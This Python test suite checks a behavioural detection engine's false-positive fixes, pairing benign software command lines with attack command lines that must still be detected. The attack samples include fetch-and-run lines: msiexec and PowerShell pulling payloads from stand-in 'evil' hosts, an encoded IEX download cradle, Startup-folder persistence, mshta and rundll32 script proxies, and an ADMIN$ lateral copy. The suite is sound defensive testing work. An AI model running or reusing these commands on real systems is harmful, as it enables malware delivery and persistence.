#!/usr/bin/env python3
"""False-positive hardening from Elastic's fleet exclusions — and the proof
that none of it cost detection.

Ten Valkyrie rules were found firing on software that a real EDR fleet had
established is legitimate (harvested from elastic/protections-artifacts). Every
narrowing below is paired here with the ATTACK it must still catch, because a
false-positive fix that quietly removes detection is not a fix - it is a
regression wearing a fix's clothes, and it is invisible unless a test says
otherwise.

So each case asserts BOTH directions:
    benign  -> must NOT fire
    attack  -> must STILL fire

The rules demoted to LOW are a different remedy and get a different assertion:
they must still fire (they carry real context) but must not be able to raise an
incident alone.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_ROOT))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from harness import Checks  # noqa: E402
from valkyrie.behavioral_rules import RULES, match_process, normalize_cmdline  # noqa: E402

_BY_ID = {r.id: r for r in RULES}
_ACTIONABLE = {"medium", "high", "critical"}


def _fires(rule_id: str, image: str, parent: str, cmd: str, path: str = "") -> bool:
    """Does this rule fire the way the ENGINE actually evaluates it?

    The RAW command line is passed, because that is what process_telemetry and
    the Sysmon path hand to classify_behavior. match_process then matches the
    raw string AND its normalised form and unions the hits, so normalisation can
    only ever add a detection.

    Getting this wrong is not hypothetical: an earlier version of this helper
    normalised first and passed the result in, so match_process normalised an
    already-normalised string. That made rundll32-lowtrust-dll look dead, and it
    was reported as a live production gap. It was not - the rule fires correctly
    on the raw command line. Test harnesses must call the code the way
    production calls it, or they measure the harness.
    """
    return any(h.rule_id == rule_id
               for h in match_process(image.lower(), parent.lower(),
                                      cmd, path.lower()))


def _pair(c: Checks, rule_id: str, *, benign: tuple, attack: tuple) -> None:
    """Assert the benign case is clear AND the attack is still caught."""
    c.check(f"{rule_id}: benign is CLEAR", not _fires(rule_id, *benign))
    c.check(f"{rule_id}: attack still CAUGHT", _fires(rule_id, *attack))


def main() -> int:
    c = Checks("FP hardening from fleet exclusions — without losing detection",
               expect_min=20)

    # ================================================================ [1]
    print("\n[1] rundll32-proxy — 'mshtml' matched printing a web page")
    _pair(c, "rundll32-proxy",
          benign=("rundll32.exe", "explorer.exe",
                  r"rundll32.exe C:\Windows\System32\mshtml.dll,PrintHTML"),
          attack=("rundll32.exe", "explorer.exe",
                  r'rundll32.exe mshtml.dll,RunHTMLApplication javascript:alert(1)'))

    # ================================================================ [2]
    print("\n[2] rundll32-lowtrust-dll — install directories are not drop zones")
    c.check("rundll32-lowtrust-dll: WebEx install dir is CLEAR",
            not _fires("rundll32-lowtrust-dll", "rundll32.exe", "explorer.exe",
                       r"rundll32.exe C:\Users\bob\AppData\Local\WebEx\WebEx\1234"
                       r"\atasctrl.dll,StartHostLauncher"))
    c.check("rundll32-lowtrust-dll: ProgramData vendor dir is CLEAR",
            not _fires("rundll32-lowtrust-dll", "rundll32.exe", "explorer.exe",
                       r"rundll32.exe C:\ProgramData\FastTrack Software"
                       r"\Admin By Request\shellhelper32.dll,#1"))
    c.check("rundll32-lowtrust-dll: Public drop STILL caught",
            _fires("rundll32-lowtrust-dll", "rundll32.exe", "explorer.exe",
                   r"rundll32.exe C:\Users\Public\evil.dll,EntryPoint"))
    c.check("rundll32-lowtrust-dll: Temp drop STILL caught",
            _fires("rundll32-lowtrust-dll", "rundll32.exe", "winword.exe",
                   r"rundll32.exe C:\Windows\Temp\payload.dll,Start"))

    # ================================================================ [3]
    print("\n[3] regasm-regsvcs-exec — ProgramData installers are not attacks")
    _pair(c, "regasm-regsvcs-exec",
          benign=("regasm.exe", "svchost.exe",
                  r"regasm.exe C:\ProgramData\PlatformInstall\gidecode\lib.dll"),
          attack=("regasm.exe", "cmd.exe",
                  r"regasm.exe /U C:\Users\Public\payload.dll"))

    # ================================================================ [4]
    print("\n[4] msiexec-remote — SYSVOL is Group Policy software deployment")
    c.check("msiexec-remote: GPO deployment from SYSVOL is CLEAR",
            not _fires("msiexec-remote", "msiexec.exe", "svchost.exe",
                       r"msiexec.exe /i \\corp.example.com\SYSVOL\corp.example.com"
                       r"\Policies\{GUID}\Machine\app.msi /q"))
    c.check("msiexec-remote: remote HTTP package STILL caught",
            _fires("msiexec-remote", "msiexec.exe", "cmd.exe",
                   r"msiexec.exe /q /i http://evil.example/payload.msi"))
    c.check("msiexec-remote: a NON-sysvol UNC package STILL caught",
            _fires("msiexec-remote", "msiexec.exe", "cmd.exe",
                   r"msiexec.exe /q /i \\10.0.0.5\share\payload.msi"))

    # ================================================================ [5]
    print("\n[5] lateral-tool-transfer — loopback is not lateral movement")
    _pair(c, "lateral-tool-transfer",
          benign=("cmd.exe", "explorer.exe",
                  r"cmd.exe /c copy tool.exe \\127.0.0.1\ADMIN$\temp\tool.exe"),
          attack=("cmd.exe", "explorer.exe",
                  r"cmd.exe /c copy tool.exe \\VICTIM-PC\ADMIN$\tool.exe"))

    # ================================================================ [6]
    print("\n[6] startup-folder-drop — WROTE a payload in, vs RAN one from")
    c.check("startup-folder-drop: running a script that lives in Startup is CLEAR",
            not _fires("startup-folder-drop", "cscript.exe", "explorer.exe",
                       r"cscript.exe C:\Users\bob\AppData\Roaming\Microsoft\Windows"
                       r"\Start Menu\Programs\Startup\logon.bat"))
    c.check("startup-folder-drop: COPYING a payload in STILL caught",
            _fires("startup-folder-drop", "cmd.exe", "winword.exe",
                   r"cmd.exe /c copy evil.exe \"C:\Users\bob\AppData\Roaming\Microsoft"
                   r"\Windows\Start Menu\Programs\Startup\evil.exe\""))
    c.check("startup-folder-drop: DOWNLOADING a payload in STILL caught",
            _fires("startup-folder-drop", "powershell.exe", "winword.exe",
                   r"powershell.exe Invoke-WebRequest http://evil/a.exe -OutFile "
                   r"'C:\Users\bob\AppData\Roaming\Microsoft\Windows\Start Menu"
                   r"\Programs\Startup\a.exe'"))

    # ================================================================ [7]
    print("\n[7] demoted to LOW — still observed, but cannot raise an incident alone")
    for rid in ("execpolicy-bypass", "powershell-encoded-command", "keymgr-creds"):
        c.check(f"{rid}: severity is LOW (context, not an incident)",
                _BY_ID[rid].severity.lower() not in _ACTIONABLE)
    c.check("execpolicy-bypass still FIRES on winget's updater (kept as context)",
            _fires("execpolicy-bypass", "powershell.exe", "cmd.exe",
                   "powershell.exe -NoProfile -ExecutionPolicy Bypass -File winget-upgrade.ps1"))

    # ---------------- the demotion must not have cost a real detection -------
    print("\n    ...and the MALICIOUS encoded payload is still caught, by the "
          "rules that read its DECODED contents")
    import base64
    evil = ("powershell.exe -EncodedCommand " + base64.b64encode(
        'IEX (New-Object Net.WebClient).DownloadString("http://evil/a.ps1")'
        .encode("utf-16-le")).decode())
    norm = normalize_cmdline(evil)
    text = (norm.text if hasattr(norm, "text") else str(norm)).lower()
    fired = {h.rule_id for h in match_process("powershell.exe", "winword.exe", text, "")}
    actionable = {r for r in fired
                  if r in _BY_ID and _BY_ID[r].severity.lower() in _ACTIONABLE}
    c.check("an encoded download cradle still raises INCIDENT-grade detections",
            len(actionable) >= 1)

    # ================================================================ [8]
    print("\n[8] the accepted false positive is DELIBERATE and documented")
    c.check("mshta-remote still fires on inline vbscript: (bypass not sold "
            "for one FP)",
            _fires("mshta-remote", "mshta.exe", "explorer.exe",
                   'mshta.exe vbscript:CreateObject("Wscript.Shell").Run("calc")'))

    # ================================================================ [10]
    print("\n[10] script-host rules: the drop-zone scoping is what keeps them safe")
    # Installers legitimately run scripts out of %TEMP% and AppData - Elastic's
    # own fleet exclusions contain such cases - so a naive "script host from a
    # writable path" rule manufactures false positives. Public/Downloads are
    # different: software does not install itself from them.
    for label, img, par, cmd in [
        ("MSI custom action from Windows\\Installer", "wscript.exe", "msiexec.exe",
         r"wscript.exe C:\Windows\Installer\MSI1234.tmp\setup.vbs"),
        ("vendor uninstaller under AppData\\Roaming", "wscript.exe", "services.exe",
         r"wscript.exe C:\Users\v\AppData\Roaming\Nextech\uninstall.vbs"),
        ("slmgr from System32", "cscript.exe", "svchost.exe",
         r"cscript.exe C:\Windows\System32\slmgr.vbs /dlv"),
        ("admin double-clicks their own script", "wscript.exe", "explorer.exe",
         r"wscript.exe C:\Scripts\backup.vbs"),
    ]:
        c.check(f"benign CLEAR: {label}",
                not _fires("scripthost-dropzone-script", img, par, cmd)
                and not _fires("scripthost-from-document", img, par, cmd))
    c.check("attack CAUGHT: script dropped in Public",
            _fires("scripthost-dropzone-script", "wscript.exe", "explorer.exe",
                   r"wscript.exe C:\Users\Public\evil.vbs"))
    c.check("attack CAUGHT: Word launches a script host, any path",
            _fires("scripthost-from-document", "wscript.exe", "winword.exe",
                   r"wscript.exe C:\Users\v\AppData\Local\Temp\macro.vbs"))

    # ================================================================ [9]
    print("\n[9] the exclusion primitive itself behaves")
    c.check("cmd_not is available on Rule", hasattr(_BY_ID["msiexec-remote"], "cmd_not"))
    c.check("a rule with ONLY exclusions and no positive term never fires",
            not any(r.matches("x.exe", "y.exe", "anything", "")
                    for r in RULES if not (r.images or r.parents or r.cmd_all
                                           or r.cmd_any or r.cmd_any2
                                           or r.cmd_any3 or r.path_any)))

    return c.finish()


if __name__ == "__main__":
    raise SystemExit(main())
